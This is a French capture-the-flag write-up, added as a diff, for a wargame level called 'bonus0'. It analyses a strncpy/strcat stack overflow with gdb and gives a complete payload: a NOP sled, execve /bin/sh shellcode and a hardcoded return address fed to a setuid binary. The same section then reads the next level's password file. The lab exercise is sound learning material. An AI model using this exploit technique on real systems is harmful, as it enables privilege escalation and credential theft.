@@ -1,0 +1,73 @@
+L'exécutable lit 4096 caractères deux fois depuis l'entrée standard (stdin),
+puis il tronque les deux résultats à 20 caractères ou jusqu'à un retour à la ligne (\n),
+ensuite il les concatène, avec un espace ' ' entre eux.
+La chaîne résultante de cette concaténation peut dépasser le tampon de taille 22 dans la fonction principale (main).
+
+Nous écrivons une très grande séquence d'instructions NOP (no operation) lors de la première lecture, suivie de notre code malveillant (shellcode).
+Lors de la deuxième lecture, nous débordons sur le pointeur de retour de la fonction principale (main).
+
+Notre payload: 
+
+
+## Comportement
+- J'ai des droits `bonus0` que je peux vérifier en tapant `whoami`
+- Un binaire est présent avec des droits différents : `-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0*`
+- En exécutant le binaire (`./bonus0`), on observe qu'il attend 2 inputs de la part de l'utilisateur. Apres les avoir recu, il print les deux separes par un espace puis quitte. 
+    ```shell
+        ./bonus0
+        -
+        test1
+        -
+        test2
+        test1 test2
+    ```
+
+
+## Analyse
+- Utilisation de deux appels à `read(stdin, buf, 4096)`. La fonction `strcpy() copie une chaîne source dans une chaîne de destination et ajoute un caractère de fin de chaîne `\0`. La fonction strncpy fonctionne de manière similaire, mais si la taille maximale est atteinte, elle ne rajoute pas le caractère de fin de chaîne. Ainsi, si le premier appel à read récupère strictement plus de 20 caractères, les 20 premiers caractères seront copiés dans la variable a sans ajout de \0 à la fin. Étant donné que la mémoire est allouée de manière contiguë, les variables a et b se suivent dans la mémoire. La fonction strcat va concaténer a et b dans le tampon buf. 
+- Si on écrit `20 + 20 + 1 + 20` caractères dans buf, cela dépasse les 42 octets alloués, entraînant un buffer overflow dans la stack. Lorsqu'on quitte `main()`, la stack est désempilée, et l'Instruction Pointer (EIP) est écrasé, provoquant un segfault.
+    ```shell
+        ./bonus0
+        -
+        abcdefghijabcdefghij
+        -
+        01234567890123456789
+        abcdefghijabcdefghij01234567890123456789 01234567890123456789
+        [1]    3889 segmentation fault  ./bonus0
+    ```
+- On constate que le buffer overflow provient du second buffer.
+```shell
+(gdb) r
+...
+Starting program: /home/user/bonus0/bonus0 
+- 
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+- 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+BBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAA��� AAAAAAAAAAAAAAAAAAAA���
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+(gdb) i r
+...
+eip            0x41414141	0x41414141
+...
+```
+- On trouve l'offset avec le pattern generator. Il est de 9 pour l'`eip`.
+
+
+## Résolution
+- On va donc remplir notre premier input d'une large pente ("slope") de NOP instructions (No Operation) au sein de laquelle on place notre shellcode. 
+- Le deuxieme input consistera d'un padding + d'une adresse dans la serie de NOP du premier input.
+- On craft notre payload: 
+    ```shell
+        python -c 'print "\x90" * 2072 + "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" + "\x90" * 2000 + "\n" + "AAAAAAAAAAAAAA" + "\x38\xe8\xff\xbf\xff" + "\n"' > /tmp/a
+        cat /tmp/a - | ./bonus0
+    ```
+- Un shell s'ouvre avec de nouveaux privilèges : en effet, si l'on tape `whoami`, on obtient `bonus1`.
+- Il ne reste plus qu'à :
+  - récupérer le password (`cat /home/user/bonus1/.pass`)
+  - quitter le shell (`exit`)
+  - et passer au bonus1 (`su bonus1`) en renseignant ce password.
+
